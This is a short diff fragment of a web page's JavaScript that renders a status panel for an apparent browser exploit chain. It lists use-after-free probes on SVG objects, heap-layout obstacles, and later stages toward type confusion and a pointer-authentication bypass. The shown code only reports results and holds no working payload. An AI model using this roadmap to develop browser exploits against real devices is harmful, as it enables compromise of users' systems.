+    (R.trf1.hit?'✅':'🔴')+' TRF1: SVGMatrix 6-float UAF (24-byte write) — '+(R.trf1.hit?'OPEN':'TBD')+' <br>'+
+    (R.svf1.hit?'✅':'🔴')+' SVF1: SVGList-level UAF — '+(R.svf1.hit?'OPEN':'TBD')+' <br><br>'+
+    '<span class="hl">Stage 1 — IsoHeap / Heap Layout</span><br>'+
+    '🔴 IsoHeap bump-only — NO freelist reuse<br>'+
+    '🔴 fastMalloc zeroes ALL allocs<br>'+
+    (R.ilp1.hit?'🟡':'🔴')+' ILP1: page layout prediction — sizeof≈'+R.ilp1.pageSize+'b<br><br>'+
+    '<span class="hl">Stage 2-6 — Type Confusion → PAC bypass</span><br>'+
+    '🔴 Blocked pending Stage 1 breakthrough<br>'+
+    (anyHit?'<br><span class="win">⚡ NEW WRITE SURFACE FOUND — expand UAF primitive</span>':'');
+  SB.appendChild(chainTxt);
 }
 </script>
 </body>
